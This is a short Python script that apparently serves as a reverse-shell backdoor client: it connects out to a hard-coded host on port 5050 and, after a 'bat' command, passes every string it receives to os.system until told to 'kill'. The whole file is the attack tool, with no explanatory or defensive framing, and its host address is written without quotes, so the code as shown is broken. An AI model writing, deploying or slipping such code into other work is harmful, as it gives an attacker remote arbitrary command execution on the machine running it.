import os
import socket


s = socket.socket()
port = 5050
host = 192.168.100.7
s.connect((host,port))

while 1:
    command = s.recv(1024)
    command = command.decode()
    if command == "stream":
        pass
        

    elif command == "bat":
        run = True

        while run:
            user_command = s.recv(5000)
            user_command = user_command.decode()
            if user_command == "kill":
                run = False
            else:
                os.system(user_command)
        
    
